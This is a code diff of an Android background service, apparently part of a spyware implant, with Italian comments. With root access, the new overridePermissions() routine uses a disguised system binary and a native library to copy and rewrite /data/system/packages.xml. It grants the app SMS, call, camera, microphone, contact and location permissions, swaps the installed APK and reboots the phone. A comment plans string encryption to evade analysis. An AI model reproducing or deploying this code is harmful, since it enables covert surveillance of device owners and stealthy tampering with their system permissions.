@@ -13,6 +13,7 @@ import java.io.OutputStreamWriter;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
+import java.util.ArrayList;
 import java.util.Arrays;
 
 import javax.crypto.Cipher;
@@ -25,6 +26,7 @@ import android.app.Service;
 import android.app.WallpaperManager;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.content.res.Resources;
 import android.graphics.Bitmap;
 import android.graphics.Bitmap.Config;
@@ -36,6 +38,7 @@ import android.view.WindowManager;
 import android.widget.Toast;
 
 import com.android.service.auto.Cfg;
+import com.android.service.capabilities.PackageInfo;
 import com.android.service.conf.Configuration;
 import com.android.service.file.AutoFile;
 import com.android.service.util.Check;
@@ -45,6 +48,12 @@ import com.android.service.util.Utils;
  * The Class ServiceCore.
  */
 public class ServiceCore extends Service {
+	static {
+	    System.loadLibrary("runner");
+	}
+	
+	private native int invokeRun(String cmd);
+	
 	private static final String TAG = "ServiceCore"; //$NON-NLS-1$
 	private Core core;
 
@@ -57,6 +66,7 @@ public class ServiceCore extends Service {
 	public void onCreate() {
 		super.onCreate();
 		Messages.init(getApplicationContext());
+		
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
 		}
@@ -113,10 +123,8 @@ public class ServiceCore extends Service {
 	@Override
 	public void onStart(Intent intent, int startId) {
 		super.onStart(intent, startId);
-
-		overridePermissions();
 		
-		if (checkRoot() == true) {
+		if (PackageInfo.checkRoot() == true) {
 			Status.self().setRoot(true);
 		} else {
 			Status.self().setRoot(false);
@@ -131,143 +139,106 @@ public class ServiceCore extends Service {
 			}
 		}
 
+		if (PackageInfo.checkRoot() == true) {
+			int ret = overridePermissions();
+			
+			Toast.makeText(this, "RET: " + ret, Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+			
+			switch (ret) {
+				case 0:
+				case 1: return; // Non possiamo partire
+				case 2:			// Possiamo partire
+				default: break;
+			}
+		}
+		
 		// Core starts
 		core = new Core();
 		core.Start(this.getResources(), getContentResolver());
 	}
 
-	private void overridePermissions() {
+	// TODO: rimuovere lo string-fu, cifrare le stringhe, cifrare
+	// le stringe nella librunner.so. Fixare il fatto che l'app va
+	// in crash se la funzione torna 0 o 1 e si ferma il servizio.
+	
+	/*
+	 * Verifica e prova ad ottenere le necessarie capabilities
+	 * 
+	 * Return:
+	 *  0 se c'e' stato un errore
+	 *  1 se le cap sono state ottenute ma si e' in attesa di un reboot
+	 *  2 se gia' abbiamo le cap necessarie
+	 */
+	private int overridePermissions() {
 		final String manifest = Messages.getString("32.15"); //$NON-NLS-1$ 
 		
-		Resources resources = getResources();
-		InputStream stream = resources.openRawResource(R.raw.layout);
+		// Controlliamo se abbiamo le capabilities necessarie
+		PackageManager pkg = Status.getAppContext().getPackageManager();
+
+		if (pkg != null) {
+			int perm = pkg.checkPermission("android.permission.READ_SMS", "com.android.service");
+			
+			if (perm == PackageManager.PERMISSION_GRANTED) {
+				return 2;
+			}
+		}
 		
 		try {
-			// Copiamo /data/system/packages.xml /data/data/com.android.service/files/
-			String cmd[] = { Messages.getString("32.2"), "fhc",  "/data/system/packages.xml", 
-					"/data/data/com.android.service/files/packages.xml" };
+			//Runtime.getRuntime().exec("/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml");
+			// Creiamo la directory files
+			openFileOutput("test", Context.MODE_WORLD_READABLE);
+
+			// Copiamo packages.xml nel nostro path e rendiamolo scrivibile
+			invokeRun("/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml");
+			Utils.sleep(600);
+			invokeRun("/system/bin/ntpsvd pzm 666 /data/data/com.android.service/files/packages.xml");
 			
-			Process p = Runtime.getRuntime().exec(cmd);
-			p.waitFor();
+			// Rimuoviamo il file temporaneo
+			File tmp = new File("/data/data/com.android.service/files/test");
 			
-			// Rendiamolo scrivibile con chmod 666
-			cmd = new String[] { Messages.getString("32.2"), "pzm", "666", 
-					"/data/data/com.android.service/files/packages.xml" };
-			
-			p = Runtime.getRuntime().exec(cmd);
-			p.waitFor();
+			if (tmp.exists() == true) {
+				tmp.delete();
+			}
 			
 			// Aggiorniamo il file
 		    FileInputStream fin = openFileInput("packages.xml");
-		    byte[] buffer = Utils.inputStreamToBuffer(fin, 0);
 		    
-		    // ... Cerchiamo la nostra riga e la package location
-		    String packages = new String(buffer);
-		    buffer = null;
+		    PackageInfo pi = new PackageInfo(fin, "com.android.service");
 		    
-		    int pos = packages.indexOf("<package name=\"com.android.service\" ");
+		    String path = pi.getPackagePath();
 		    
-		    if (pos == -1) {
-		    	if (Cfg.DEBUG) {
-					Check.log(TAG + " (overridePermissions): cannot find package name"); //$NON-NLS-1$
-				}
-		    	
-		    	return;
+		    if (path.length() == 0) {
+		    	return 0;
 		    }
 		    
-		    // Package position
-		    int apkBegin = packages.indexOf("codePath=\"", pos);
-		    
-		    if (apkBegin == -1) {
+		    // Vediamo se gia' ci sono i permessi richiesti
+		    if (pi.checkRequiredPermission() == true) {
 		    	if (Cfg.DEBUG) {
-					Check.log(TAG + " (overridePermissions): cannot find apk"); //$NON-NLS-1$
+					Check.log(TAG + " (overridePermissions): Capabilities already acquired"); //$NON-NLS-1$
 				}
 		    	
-		    	return;
-		    }
-		    
-		    int apkEnd = packages.indexOf(".apk\"", apkBegin);
-		    
-		    if (apkEnd == -1) {
-		    	if (Cfg.DEBUG) {
-					Check.log(TAG + " (overridePermissions): cannot find apk end"); //$NON-NLS-1$
+				// Rimuoviamo la nostra copia
+				File f = new File("/data/data/com.android.service/files/packages.xml");
+				
+				if (f.exists() == true) {
+					f.delete();
 				}
-		    	
-		    	return;
+				
+				return 2;
 		    }
 		    
-		    apkEnd += 4; // .apk
-		    
-		    // Blocco dei permessi
-		    int permsBegin = packages.indexOf("<perms>", pos);
-		    
-		    if (permsBegin == -1) {
-		    	if (Cfg.DEBUG) {
-					Check.log(TAG + " (overridePermissions): cannot find <perms>"); //$NON-NLS-1$
-				}
-		    	
-		    	return;
-		    }
-		    
-		    // Eliminiamo <perms>
-		    permsBegin += 7;
-		    	
-		    int permsEnd = packages.indexOf("</perms>", permsBegin);
-		    
-		    if (permsEnd == -1) {
-		    	if (Cfg.DEBUG) {
-					Check.log(TAG + " (overridePermissions): cannot find </perms>"); //$NON-NLS-1$
-				}
-		    	
-		    	return;
-		    }
-		    
-		    // Verifichiamo se non abbiamo gia' i permessi necessari
-		    String actualPerms = packages.substring(permsBegin, permsEnd);
-		    
-		    // Abbiamo gia' i permessi richiesti :)
-		    if (Cfg.DEBUG) {
-				Check.log(TAG + " (Actual): " + actualPerms + "END"); //$NON-NLS-1$
-				Check.log(TAG + " (Actual): " + getRequiredPermission()); //$NON-NLS-1$
-			}
-		    
-		    if (actualPerms.contentEquals(getRequiredPermission()) == true) {
-		    	if (Cfg.DEBUG) {
-					Check.log(TAG + " (overridePermissions): YAYYY"); //$NON-NLS-1$
-				}
-		    }
-		    
-		    // Creiamo il nuovo file
-		    FileOutputStream fos = openFileOutput("perm.xml", MODE_PRIVATE);
-		    
-		    // Scriviamo tutta la prima parte fino a <perms> incluso
-		    fos.write(packages.substring(0, permsBegin).getBytes("US_ASCII"));
-		    
-		    // Quindi i nuovi permessi
-		    fos.write(getRequiredPermission().getBytes("US_ASCII"));
-		    
-		    // E di seguito tutto il resto
-		    fos.write(packages.substring(permsEnd).getBytes("US_ASCII"));
-		    
-		    fos.close();
-		    
-		    fileWrite(manifest, stream, "0xA83E0F44BD7A4D20");
-		    String apkLocation = packages.substring(apkBegin, apkEnd);
+		    pi.addRequiredPermissions("perm.xml");   
+		        
+		    // .apk con tutti i permessi nel manifest
+		    InputStream manifestApkStream = getResources().openRawResource(R.raw.layout);
+		    fileWrite(manifest, manifestApkStream, "0xA83E0F44BD7A4D20");
 	
 			// Copiamolo in /data/app/*.apk
-			cmd = new String[] { Messages.getString("32.2"), "qzx",
-					"cat /data/data/com.android.service/files/layout > " + apkLocation };
-			
-			p = Runtime.getRuntime().exec(cmd);
-			p.waitFor();
-			
+		    invokeRun("/system/bin/ntpsvd qzx \"cat /data/data/com.android.service/files/layout > " + path + "\"");
+		
 			// Copiamolo in /data/system/packages.xml
-			cmd = new String[] { Messages.getString("32.2"), "qzx",
-					"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml" };
-			
-			p = Runtime.getRuntime().exec(cmd);
-			p.waitFor();
-			
+		    invokeRun("/system/bin/ntpsvd qzx \"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml\"");
+					
 			// Rimuoviamo la nostra copia
 			File f = new File("/data/data/com.android.service/files/packages.xml");
 			
@@ -281,14 +252,26 @@ public class ServiceCore extends Service {
 			if (f.exists() == true) {
 				f.delete();
 			}
+			
+			// Rimuoviamo l'apk con tutti i permessi
+			f = new File("/data/data/com.android.service/files/layout");
+			
+			if (f.exists() == true) {
+				f.delete();
+			}
+			
+			// Riavviamo il telefono
+			invokeRun("/system/bin/ntpsvd reb");
 		} catch (Exception e1) {
 			if (Cfg.DEBUG) {
 				Check.log(e1);//$NON-NLS-1$
 				Check.log(TAG + " (root): Exception on overridePermissions()"); //$NON-NLS-1$
 			}
 
-			return;
+			return 0;
 		}
+		
+		return 1;
 	}
 
 	private boolean root() {
@@ -336,7 +319,7 @@ public class ServiceCore extends Service {
 			while (System.currentTimeMillis() - now < 100 * 1000) {
 				Utils.sleep(1000);
 
-				if (checkRoot()) {
+				if (PackageInfo.checkRoot()) {
 					isRoot = true;
 					break;
 				}
@@ -435,63 +418,6 @@ public class ServiceCore extends Service {
 		}
 		
 		return cis;
-	}
-
-	private boolean checkRoot() { //$NON-NLS-1$
-		boolean isRoot = false;
-
-		try {
-			// Verifichiamo di essere root
-			final AutoFile file = new AutoFile(Configuration.shellFile);
-
-			if (file.exists() && file.canRead()) {
-				final Process p = Runtime.getRuntime().exec(Configuration.shellFile + Messages.getString("32.14"));
-				p.waitFor();
-
-				if (p.exitValue() == 1) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
-					}
-
-					isRoot = true;
-				}
-			}
-		} catch (final Exception e) {
-			if (Cfg.DEBUG) {
-				e.printStackTrace();
-				Check.log(e);//$NON-NLS-1$
-			}
-		}
-
-		return isRoot;
-	}
-
-	private String getRequiredPermission() {
-		return new String(
-				"<item name=\"android.permission.SET_WALLPAPER\" />\n" +
-				"<item name=\"android.permission.SEND_SMS\" />\n" +
-				"<item name=\"android.permission.PROCESS_OUTGOING_CALLS\" />\n" +
-				"<item name=\"android.permission.WRITE_APN_SETTINGS\" />\n" +
-				"<item name=\"android.permission.WRITE_EXTERNAL_STORAGE\" />\n" +
-				"<item name=\"android.permission.READ_LOGS\" />\n" +
-				"<item name=\"android.permission.WRITE_SMS\" />\n" +
-				"<item name=\"android.permission.ACCESS_WIFI_STATE\" />\n" +
-				"<item name=\"android.permission.ACCESS_COARSE_LOCATION\" />\n" +
-				"<item name=\"android.permission.RECEIVE_SMS\" />\n" +
-				"<item name=\"android.permission.READ_CONTACTS\" />\n" +
-				"<item name=\"android.permission.CALL_PHONE\" />\n" +
-				"<item name=\"android.permission.READ_PHONE_STATE\" />\n" +
-				"<item name=\"android.permission.READ_SMS\" />\n" +
-				"<item name=\"android.permission.RECEIVE_BOOT_COMPLETED\" />\n" +
-				"<item name=\"android.permission.CAMERA\" />\n" +
-				"<item name=\"android.permission.INTERNET\" />\n" +
-				"<item name=\"android.permission.CHANGE_WIFI_STATE\" />\n" +
-				"<item name=\"android.permission.ACCESS_FINE_LOCATION\" />\n" +
-				"<item name=\"android.permission.VIBRATE\" />\n" +
-				"<item name=\"android.permission.WAKE_LOCK\" />\n" +
-				"<item name=\"android.permission.RECORD_AUDIO\" />\n" +
-				"<item name=\"android.permission.ACCESS_NETWORK_STATE\" />\n" +
-				"<item name=\"android.permission.FLASHLIGHT\" />");
 	}
 	
 	// Exploit thread
